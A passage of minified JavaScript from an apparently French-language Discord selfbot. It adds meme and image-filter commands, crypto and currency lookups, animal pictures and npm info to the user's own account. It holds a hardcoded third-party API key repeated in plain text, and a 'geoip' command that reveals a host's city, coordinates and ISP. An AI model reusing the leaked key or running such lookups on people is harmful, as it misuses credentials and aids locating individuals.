                            var cq = new aw.RichEmbed().setImage('https://api.alexflipnote.dev/filter/communist?image=' + mY + '?size=2048').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'drake')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              d8 = cN.slice(0);
                            let n0 = d8[1],
                              n1 = d8[2];
                            var cq = new aw.RichEmbed().setImage('https://api.alexflipnote.dev/drake?top=' + n0 + '&bottom=' + n1).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'saturation')) {
                          if (cg.author.id === aN.user.id) {
                            let n3 = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                              n4 = n3.displayAvatarURL;
                            var cq = new aw.RichEmbed().setImage('https://api.alexflipnote.dev/filter/deepfry?image=' + n4 + '?size=2048').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'snow')) {
                          if (cg.author.id === aN.user.id) {
                            let n5 = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                              n6 = n5.displayAvatarURL;
                            var cq = new aw.RichEmbed().setImage('https://api.alexflipnote.dev/filter/snow?image=' + n6 + '?size=2048').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'geoip')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              d8 = cN.slice(0);
                            let n7 = d8[1];
                            aD.get('https://api.c99.nl/geoip?key=NYK0X-0S6BJ-8EA8G-U5LRV&host=' + n7 + '&json').then(n8 => {
                              if (n8.body.success == false) return cg.edit('**Adresse ip invalide**');
                              var n9 = new aw.RichEmbed().setTitle('**Géo ip**').setImage(bm).setColor(ad).addField('IP', n8.body.ip).addField('Hostname', n8.body.hostname).addField('Pays code', n8.body.records.country_code).addField('Pays code 3', n8.body.records.country_code3).addField('Nom du Pays', n8.body.records.country_name).addField('Code', n8.body.records.region.code).addField('Nom de la Région', n8.body.records.region.name).addField('Nom de la ville', n8.body.records.city).addField('Code postale', n8.body.records.postal_code).addField('Latitude', n8.body.records.latitude).addField('Longitude', n8.body.records.longitude).addField('Code du merto', n8.body.records.metro_code).addField('Îsp', n8.body.records.isp).addField('Organisation', n8.body.records.organization).addField('Asn', n8.body.records.asn).addField('Format', n8.body.records.timezone.format).addField('Temps', n8.body.records.timezone.time).addField('Code continent', n8.body.records.continent.code).addField('Continent', n8.body.records.continent.name).setThumbnail(n8.body.records.flag_360px).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(n9);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'btc')) {
                          cg.author.id === aN.user.id && aD.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR').then(n9 => {
                            var na = n9.body.USD,
                              nb = n9.body.EUR,
                              nc = new aw.RichEmbed().setTitle('BTC Stats').setDescription('EUR: ' + nb + '\nUSD: ' + na).setThumbnail('https://cdn.discordapp.com/attachments/732513063231684640/732513084668772383/A-propos-de-cette-Orange-B-...-Lhistoire-des-logos.jpg').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(nc);
                          });
                        }
                        cg.content.startsWith(ab + 'currency') && cg.author.id === aN.user.id && aD.get('https://api.c99.nl/currency?key=NYK0X-0S6BJ-8EA8G-U5LRV&amount=1&from=USD&to=EUR&json').then(n9 => {
                          var na = new aw.RichEmbed().setTitle('USD to EUR').setDescription('USD: 1' + cn + '\nEUR: ' + n9.body.amount).setThumbnail('https://cdn.discordapp.com/attachments/731197380732518460/738696936592375918/symbole-d-euro-et-de-dollar-paires-d-eur-usd-39052942.jpg').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                          cg.edit(na);
                        });
                        if (cg.content.startsWith(ab + 'allusd')) {
                          if (cg.author.id === aN.user.id) {
                            aD.get('https://api.c99.nl/currencyrates?key=NYK0X-0S6BJ-8EA8G-U5LRV&source=USD&json').then(nb => {
                              var nc = '\n    AED: ' + nb.body.data.AED + '\n\n    AFN: ' + nb.body.data.AFN + '\n\n    ALL: ' + nb.body.data.ALL + '\n\n    AMD: ' + nb.body.data.AMD + '\n\n    ANG: ' + nb.body.data.ANG + '\n\n    AOA: ' + nb.body.data.AOA + '\n\n    ARS: ' + nb.body.data.ARS + '\n\n    AUD: ' + nb.body.data.AUD + '\n\n    AWG: ' + nb.body.data.AWG + '\n\n    AZN: ' + nb.body.data.AZN + '\n\n    BAM: ' + nb.body.data.BAM + '\n\n    BBD: ' + nb.body.data.BBD + '\n\n    BDT: ' + nb.body.data.BDT + '\n\n    BGN: ' + nb.body.data.BGN + '\n\n    BHD: ' + nb.body.data.BHD + '\n\n    BIF: ' + nb.body.data.BIF + '\n\n    BMD: ' + nb.body.data.BMD + '\n\n    BND: ' + nb.body.data.BND + '\n\n    BOB: ' + nb.body.data.BOB + '\n\n    BRL: ' + nb.body.data.BRL + '\n\n    BSD: ' + nb.body.data.BSD + '\n\n    BTC: ' + nb.body.data.BTC + '\n\n    BTN: ' + nb.body.data.BTN + '\n\n    BWP: ' + nb.body.data.BWP + '\n\n    BYN: ' + nb.body.data.BYN + '\n\n    CAD: ' + nb.body.data.CAD + '\n\n    CDF: ' + nb.body.data.CDF + '\n\n    CHF: ' + nb.body.data.CHF + '\n\n    CRC: ' + nb.body.data.CRC + '\n\n    CZK: ' + nb.body.data.CZK + '\n\n    DJF: ' + nb.body.data.DJF + '\n\n    DKK: ' + nb.body.data.DKK + '\n\n    DOP: ' + nb.body.data.DOP + '\n\n    DZD: ' + nb.body.data.DZD + '\n\n    EGP: ' + nb.body.data.EGP + '\n\n    ETB: ' + nb.body.data.ETB + '\n\n    ETH: ' + nb.body.data.ETH + '\n\n    EUR: ' + nb.body.data.EUR + '\n\n    FJD: ' + nb.body.data.FJD + '\n\n    FKP: ' + nb.body.data.FKP + '\n\n    GBP: ' + nb.body.data.GBP + '\n\n    GEL: ' + nb.body.data.GEL + '\n\n    GHS: ' + nb.body.data.GHS + '\n\n    GIP: ' + nb.body.data.GIP + '\n\n    GMD: ' + nb.body.data.GMD + '\n\n    GNF: ' + nb.body.data.GNF + '\n\n    GTQ: ' + nb.body.data.GTQ + '\n\n    GYD: ' + nb.body.data.GYD + '\n\n    HKD: ' + nb.body.data.HKD + '\n\n    HNL: ' + nb.body.data.HNL + '\n\n    HRK: ' + nb.body.data.HRK + '\n\n    HTG: ' + nb.body.data.HTG + '\n\n    HUF: ' + nb.body.data.HUF + '\n\n    IDR: ' + nb.body.data.IDR + '\n\n    ILS: ' + nb.body.data.ILS + '\n\n    INR: ' + nb.body.data.INR + '\n\n    IQD: ' + nb.body.data.IQD + '\n\n    IRR: ' + nb.body.data.IRR + '\n\n    ISK: ' + nb.body.data.ISK + '\n\n    JMD: ' + nb.body.data.JMD + '\n\n    JOD: ' + nb.body.data.JOD + '\n\n    JPY: ' + nb.body.data.JPY + '\n\n    KES: ' + nb.body.data.KES + '\n\n    KWD: ' + nb.body.data.KWD + '\n\n    KYD: ' + nb.body.data.KYD + '\n\n    KZT: ' + nb.body.data.KZT + '\n\n    LAK: ' + nb.body.data.LAK + '\n\n    LBP: ' + nb.body.data.LBP + '\n\n    LKR: ' + nb.body.data.LKR + '\n\n    LRD: ' + nb.body.data.LRD + '\n\n    LSL: ' + nb.body.data.LSL + '\n\n    LTC: ' + nb.body.data.LTC + '\n\n    LYD: ' + nb.body.data.LYD + '\n\n    MAD: ' + nb.body.data.MAD + '\n\n    MDL: ' + nb.body.data.MDL + '\n\n    MGA: ' + nb.body.data.MGA + '\n\n    MKD: ' + nb.body.data.MKD + '\n\n    MMK: ' + nb.body.data.MMK + '\n\n    MNT: ' + nb.body.data.MNT + '\n\n    MOP: ' + nb.body.data.MOP + '\n\n    MRU: ' + nb.body.data.MRU + '\n\n    MUR: ' + nb.body.data.MUR + '\n\n    MVR: ' + nb.body.data.MVR + '\n\n    MWK: ' + nb.body.data.MWK + '\n\n    MXN: ' + nb.body.data.MXN + '\n\n    MYR: ' + nb.body.data.MYR + '\n\n    MZN: ' + nb.body.data.MZN + '\n\n    NAD: ' + nb.body.data.NAD + '\n\n    NGN: ' + nb.body.data.NGN + '\n\n    NIO: ' + nb.body.data.NIO + '\n\n    NOK: ' + nb.body.data.NOK + '\n\n    NPR: ' + nb.body.data.NPR + '\n\n    NZD: ' + nb.body.data.NZD + '\n\n    OMR: ' + nb.body.data.OMR + '\n\n    PAB: ' + nb.body.data.PAB + '\n\n    PEN: ' + nb.body.data.PEN + '\n\n    PGK: ' + nb.body.data.PGK + '\n\n    PHP: ' + nb.body.data.PHP + '\n\n    PKR: ' + nb.body.data.PKR + '\n\n    PLN: ' + nb.body.data.PLN + '\n\n    PYG: ' + nb.body.data.PYG + '\n\n    QAR: ' + nb.body.data.QAR + '\n\n    RON: ' + nb.body.data.RON + '\n\n    RSD: ' + nb.body.data.RSD + '\n\n    RUB: ' + nb.body.data.RUB + '\n\n    RWF: ' + nb.body.data.RWF + '\n\n    SAR: ' + nb.body.data.SAR + '\n\n    SBD: ' + nb.body.data.SBD + '\n\n    SCR: ' + nb.body.data.SCR + '\n\n    SDG: ' + nb.body.data.SDG + '\n\n    SEK: ' + nb.body.data.SEK + '\n\n    SGD: ' + nb.body.data.SGD + '\n\n    SHP: ' + nb.body.data.SHP + '\n\n    SLL: ' + nb.body.data.SLL + '\n\n    SOS: ' + nb.body.data.SOS + '\n\n    SRD: ' + nb.body.data.SRD + '\n\n    SSP: ' + nb.body.data.SSP + '\n\n    STN: ' + nb.body.data.STN + '\n\n    SYP: ' + nb.body.data.SYP + '\n\n    SZL: ' + nb.body.data.SZL + '\n\n    THB: ' + nb.body.data.THB + '\n\n    TJS: ' + nb.body.data.TJS + '\n\n    TMT: ' + nb.body.data.TMT + '\n\n    TND: ' + nb.body.data.TND + '\n\n    TOP: ' + nb.body.data.TOP + '\n\n    TRY: ' + nb.body.data.TRY + '\n\n    TTD: ' + nb.body.data.TTD + '\n\n    TWD: ' + nb.body.data.TWD + '\n\n    TZS: ' + nb.body.data.TZS + '\n\n    UAH: ' + nb.body.data.UAH + '\n\n    UGX: ' + nb.body.data.UGX + '\n\n    USD: ' + nb.body.data.USD + '\n\n    UYU: ' + nb.body.data.UYU + '\n\n    UZS: ' + nb.body.data.UZS + '\n\n    VES: ' + nb.body.data.VES + '\n\n    VND: ' + nb.body.data.VND + '\n\n    VUV: ' + nb.body.data.VUV + '\n\n    WST: ' + nb.body.data.WST + '\n\n    XAF: ' + nb.body.data.XAF + '\n\n    XAG: ' + nb.body.data.XAG + '\n\n    XAU: ' + nb.body.data.XAU + '\n\n    XCD: ' + nb.body.data.XCD + '\n\n    XOF: ' + nb.body.data.XOF + '\n\n    XPF: ' + nb.body.data.XPF + '\n\n    XPT: ' + nb.body.data.XPT + '\n\n    XRP: ' + nb.body.data.XRP + '\n\n    YER: ' + nb.body.data.YER + '\n\n    ZAR: ' + nb.body.data.ZAR + '\n\n    ZMW: ' + nb.body.data.ZMW + '\n';
                              aE(nc).then(ne => {
                                var nf = new aw.RichEmbed().setTitle('USD all').setDescription(ne).setThumbnail('https://cdn.pixabay.com/photo/2017/10/21/08/11/usd-2874026_960_720.jpg').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                cg.edit(nf);
                              });
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'ltc')) {
                          if (cg.author.id === aN.user.id) {
                            aD.get('https://min-api.cryptocompare.com/data/price?fsym=LTC&tsyms=USD,EUR').then(nc => {
                              var nd = nc.body.USD,
                                ne = nc.body.EUR,
                                nf = new aw.RichEmbed().setTitle('LTC Stats').setDescription('EUR: ' + ne + '\nUSD: ' + nd).setThumbnail('https://cdn.discordapp.com/attachments/732513063231684640/732513084551200798/220px-LTC-400.png').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(nf);
                            });
                          }
                        }
                        cg.content.startsWith(ab + 'eth') && cg.author.id === aN.user.id && aD.get('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR').then(nc => {
                          var nd = nc.body.USD,
                            ne = nc.body.EUR,
                            nf = new aw.RichEmbed().setTitle('ETH Stats').setDescription('EUR: ' + ne + '\nUSD: ' + nd).setThumbnail('https://cdn.discordapp.com/attachments/732513063231684640/732513084933144666/pp840x830-pad1000x1000f8f8f8.u3.jpg').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                          cg.edit(nf);
                        });
                        cg.content === ab + 'fox' && cg.author.id === aN.user.id && aD.get('https://some-random-api.ml/img/fox').then(nc => {
                          var nf = nc.body.link,
                            ng = new aw.RichEmbed().setTitle(aN.user.username + ' ** Random FOXX **').setImage(nf).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                          cg.edit(ng);
                        });
                        if (cg.content === ab + 'panda') {
                          cg.author.id === aN.user.id && aD.get('https://some-random-api.ml/img/panda').then(nd => {
                            var ng = nd.body.link,
                              nh = new aw.RichEmbed().setTitle(aN.user.username + ' ** Random PANDA **').setImage(ng).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(nh);
                          });
                        }
                        cg.content === ab + 'panda roux' && cg.author.id === aN.user.id && aD.get('https://some-random-api.ml/img/red_panda').then(nd => {
                          var ne = nd.body.link,
                            nf = new aw.RichEmbed().setTitle(aN.user.username + ' ** Random PANDA ROUX **').setImage(ne).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                          cg.edit(nf);
                        });
                        if (cg.content === ab + 'wink') {
                          cg.author.id === aN.user.id && aD.get('https://some-random-api.ml/animu/wink').then(ne => {
                            var nh = ne.body.link,
                              ni = new aw.RichEmbed().setTitle(aN.user.username + ' **Clin d\'oeil**').setImage(nh).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(ni);
                          });
                        }
                        cg.content === ab + 'koala' && cg.author.id === aN.user.id && aD.get('https://some-random-api.ml/img/koala').then(ne => {
                          var nf = ne.body.link,
                            ng = new aw.RichEmbed().setTitle(aN.user.username + ' ** Random KOALA **').setImage(nf).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                          cg.edit(ng);
                        });
                        if (cg.content === ab + 'dogs') {
                          cg.author.id === aN.user.id && aD.get('https://dog.ceo/api/breeds/image/random').then(nf => {
                            var ng = nf.body.message,
                              nh = new aw.RichEmbed().setTitle(aN.user.username + ' ** Random dogs **').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setImage(ng).setColor(ad);
                            cg.edit(nh);
                          });
                        }
                        if (cg.content.startsWith(ab + 'gay')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            let nf = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                              ng = nf.displayAvatarURL;
                            var cq = new aw.RichEmbed().setTitle('GAY').setImage('https://api.alexflipnote.dev/filter/gay?image=' + ng + '?size=2048').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'triggered')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            let nh = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                              ni = nh.displayAvatarURL;
                            var ef = {};
                            ef.url = ni;
                            let nj = aO.generate('triggered', ef).then(nl => {
                              var nm = {};
                              nm.attachment = nl, nm.name = 'triggered.gif';
                              var nn = {};
                              nn.files = [nm], cg.channel.send(nn);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'ps4')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              if (cg.deletable) cg.delete();
                              let nm = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                                nn = nm.displayAvatarURL;
                              var eg = {};
                              eg.url = nn;
                              let no = aO.generate('ps4', eg).then(np => {
                                var nq = {};
                                nq.attachment = np, nq.name = 'ps4.gif';
                                var nr = {};
                                nr.files = [nq], cg.channel.send(nr);
                              });
                            } else cg.channel.send(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'beautiful')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            let nq = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                              nr = nq.displayAvatarURL;
                            var eh = {};
                            eh.url = nr;
                            let ns = aO.generate('beautiful', eh).then(nt => {
                              var nw = {};
                              nw.attachment = nt, nw.name = 'beautiful.gif';
                              var nx = {};
                              nx.files = [nw], cg.channel.send(nx);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'burn')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            let nu = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                              nv = nu.displayAvatarURL;
                            var ei = {};
                            ei.url = nv;
                            let nw = aO.generate('burn', ei).then(nx => {
                              var ny = {};
                              ny.attachment = nx, ny.name = 'burn.gif';
                              var nz = {};
                              nz.files = [ny], cg.channel.send(nz);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'fire')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            let nx = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                              ny = nx.displayAvatarURL;
                            var ej = {};
                            ej.url = ny;
                            let nz = aO.generate('fire', ej).then(nA => {
                              var nB = {};
                              nB.attachment = nA, nB.name = 'fire.gif';
                              var nC = {};
                              nC.files = [nB], cg.channel.send(nC);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'challenger')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            let nA = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                              nB = nA.displayAvatarURL;
                            var ek = {};
                            ek.url = nB;
                            let nC = aO.generate('challenger', ek).then(nD => {
                              var nE = {};
                              nE.attachment = nD, nE.name = 'challenger.gif';
                              var nF = {};
                              nF.files = [nE], cg.channel.send(nF);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'emboss')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            let nD = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                              nE = nD.displayAvatarURL;
                            var eo = {};
                            eo.url = nE;
                            let nF = aO.generate('emboss', eo).then(nG => {
                              var nH = {};
                              nH.attachment = nG, nH.name = 'emboss.gif';
                              var nI = {};
                              nI.files = [nH], cg.channel.send(nI);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'posterize')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            let nG = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                              nH = nG.displayAvatarURL;
                            var ep = {};
                            ep.url = nH;
                            let nI = aO.generate('posterize', ep).then(nJ => {
                              var nK = {};
                              nK.attachment = nJ, nK.name = 'posterize.gif';
                              var nL = {};
                              nL.files = [nK], cg.channel.send(nL);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'wanted')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            let nK = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                              nL = nK.displayAvatarURL;
                            var eq = {};
                            eq.url = nL;
                            let nM = aO.generate('wanted', eq).then(nN => {
                              var nO = {};
                              nO.attachment = nN, nO.name = 'wanted.gif';
                              var nP = {};
                              nP.files = [nO], cg.channel.send(nP);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'crush')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            if (c9) {
                              let nN = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                                nO = nN.displayAvatarURL;
                              var er = {};
                              er.url = nO;
                              let nP = aO.generate('crush', er).then(nQ => {
                                var nR = {};
                                nR.attachment = nQ, nR.name = 'crush.gif';
                                var nS = {};
                                nS.files = [nR], cg.channel.send(nS);
                              });
                            } else {
                              cg.channel.send(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'brazzers')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            if (c9) {
                              let nU = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                                nV = nU.displayAvatarURL;
                              var es = {};
                              es.url = nV;
                              let nW = aO.generate('brazzers', es).then(nX => {
                                var nY = {};
                                nY.attachment = nX, nY.name = 'brazzers.gif';
                                var nZ = {};
                                nZ.files = [nY], cg.channel.send(nZ);
                              });
                            } else {
                              cg.channel.send(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'tobecontinued')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            let nY = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                              nZ = nY.displayAvatarURL;
                            var et = {};
                            et.url = nZ;
                            let o0 = aO.generate('tobecontinued', et).then(o1 => {
                              var o2 = {};
                              o2.attachment = o1, o2.name = 'tobecontinued.gif';
                              var o3 = {};
                              o3.files = [o2], cg.channel.send(o3);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'greyscale')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            let o2 = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                              o3 = o2.displayAvatarURL;
                            var cq = new aw.RichEmbed().setTitle('GREYSCALE').setImage('https://some-random-api.ml/canvas/greyscale?avatar=' + o3 + '?size=2048').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'invert')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              let o5 = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                                o6 = o5.displayAvatarURL;
                              var cq = new aw.RichEmbed().setTitle('INVERT').setImage('https://some-random-api.ml/canvas/invert?avatar=' + o6 + '?size=2048').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(cq);
                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'wasted')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            let o7 = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                              o8 = o7.displayAvatarURL;
                            var cq = new aw.RichEmbed().setTitle('WASTED').setImage('https://some-random-api.ml/canvas/wasted?avatar=' + o8 + '?size=2048').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content === ab + 'pikachu') {
                          cg.author.id === aN.user.id && aD.get('https://some-random-api.ml/img/pikachu').then(ob => {
                            var oc = ob.body.link,
                              od = new aw.RichEmbed().setTitle(aN.user.username + ' ** Random PIKACHU **').setImage(oc).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(od);
                          });
                        }
                        if (cg.content.startsWith(ab + 'pat')) {
                          cg.author.id === aN.user.id && aD.get('https://some-random-api.ml/animu/pat').then(ob => {
                            var oc = ob.body.link;
                            cg.mentions.users.first() ? user = cg.mentions.users.first() : user = cg.author;
                            var od = new aw.RichEmbed().setTitle(user.username + ' ** Bien gamin **').setImage(oc).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(od);
                          });
                        }
                        var cN = cg.content.split(' '),
                          dt = cN.slice(1);
                        if (cg.content.startsWith(ab + 'binaireencode')) {
                          if (cg.author.id === aN.user.id) {
                            c9 ? aD.get('https://some-random-api.ml/binary?text=' + dt).then(oe => {
                              var of = oe.body.binary,
                                og = new aw.RichEmbed().setTitle(aN.user.username + ' ** BINAIRES ENCODE **').setDescription('**Originale:** ' + dt + ' \n **Encode:** ' + of).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(og);
                            }) : cg.edit(cu);
                          }
                        }
                        var cN = cg.content.split(' '),
                          dt = cN.slice(1);
                        if (cg.content.startsWith(ab + 'binairedecode')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) aD.get('https://some-random-api.ml/binary?decode=' + dt).then(oe => {
                              var of = oe.body.text,
                                og = new aw.RichEmbed().setTitle(aN.user.username + ' ** BINAIRES DECODE **').setDescription('**Originale:** ' + dt + ' \n **Decode:** ' + of).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(og);
                            });else {
                              cg.edit(cu);
                            }
                          }
                        }
                        cg.content.startsWith(ab + 'gtokenfree') && cg.author.id === aN.user.id && aD.get('https://some-random-api.ml/bottoken').then(of => {
                          var og = of.body.token,
                            oh = new aw.RichEmbed().setTitle('** Token Random Free **').setDescription(':warning: ||' + og + '|| :warning:').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                          cg.edit(oh);
                        });
                        if (cg.content.startsWith(ab + 'pokedex')) {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            let of = cg.content.split(' ').slice(1);
                            aD.get('https://some-random-api.ml/pokedex?pokemon=' + of[0]).then(og => {
                              var oh = new aw.RichEmbed().setTitle(aN.user.username + ' ** POKEDEX **').setDescription(og.body.description).addField('```Name:```', og.body.name).addField('```ID:```', og.body.id).addField('```Génération:```', og.body.generation).addField('```Type:```', og.body.type).addField('```Spécificités:```', og.body.species).addField('```Abilities:```', og.body.abilities).addField('```Genre:```', og.body.gender).addField('```Groupe:```', og.body.egg_groups).addField('```Experience:```', og.body.base_experience).addField('```Hp:```', og.body.stats.hp).addField('```Attack:```', og.body.stats.attack).addField('```Defense:```', og.body.stats.defense).addField('```Vitesse d\'attaque:```', og.body.stats.sp_atk).addField('```Vitesse de defense:```', og.body.stats.sp_def).addField('```Vitesse:```', og.body.stats.speed).addField('```Total:```', og.body.stats.total).addField('```Poids:```', og.body.weight).addField('```Hauteur:```', og.body.height).addField('```Speed:```', og.body.speed).addField('```EvolutionLine:```', evolutionLine).setImage('http://i.some-random-api.ml/pokemon/' + of[0] + '.gif').setThumbnail('http://i.some-random-api.ml/pokemon/' + of[0] + '.png').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.channel.send(oh);
                            });
                          }
                        }
                        var cN = cg.content.split(' '),
                          dt = cN.slice(1);
                        if (cg.content.startsWith(ab + 'searchmusic')) {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            let og = dt.slice(0).join(' ');
                            aD.get('https://some-random-api.ml/lyrics?title=' + og).then(oh => {
                              var om = oh.body.title;
                              var ok = oh.body.author;
                              var on = oh.body.lyrics;
                              var ol = oh.body.thumbnail;
                              var op = oh.body.genius;
                              var oo = new aw.RichEmbed().setTitle(aN.user.username + ' ** Search Music **').setDescription('searchmusic').addField('Titre: \n ' + om + ' \n').addField('Auteur: \n ' + ok + ' \n').setThumbnail(op).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.channel.send(oo);
                            });
                          }
                        }
                        var cN = cg.content.split(' '),
                          dt = cN.slice(1);
                        if (cg.content.startsWith(ab + 'searchmusic')) {
                          if (cg.author.id === aN.user.id) {
                            let oh = dt.slice(0).join(' ');
                            aD.get('https://some-random-api.ml/lyrics?title=' + oh).then(oi => {
                              var on = oi.body.lyrics;
                              var om = oi.body.title;
                              var ol = 'Paroles: ' + on;
                              console.log(ay.hex(w)(ol));
                              cg.channel.send('**Les paroles de ' + om + ' sont dans les logs**');
                            });
                          }
                        }
                        if (cg.content.includes(ab + 'npm')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              d8 = cN.slice(1);
                            let oj = d8.slice(0).join(' ');
                            if (!oj) {
                              cg.edit(':x: Vous n\'avez pas mentionné de mudule ! Exemple/Usage : ```css\n ' + ab + 'npm discord.js\n```');
                              return;
                            }
                            aD.get('https://registry.npmjs.com/' + oj).then(ol => {
                              const om = ol.body.versions[ol.body['dist-tags'].latest];
                              var on = new aw.RichEmbed().setColor(ad).setAuthor('NPM', 'https://i.imgur.com/ErKf5Y0.png', 'https://www.npmjs.com/').setTitle(ol.body.name).setURL('https://www.npmjs.com/package/' + oj).setDescription(ol.body.description || 'No description.').addField('❯ Version', ol.body['dist-tags'].latest, true).addField('❯ License', ol.body.license || 'None', true).addField('❯ Author', ol.body.author ? ol.body.author.name : '???', true).addField('❯ Creation Date', ax.utc(ol.body.time.created).format('MM/DD/YYYY h:mm A'), true).addField('❯ Modification Date', ax.utc(ol.body.time.modified).format('MM/DD/YYYY h:mm A'), true).addField('❯ Main File', om.main || 'index.js', true).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(on);
                            });
                          }
                        }
                        if (cg.content.includes(ab + 'debitage')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
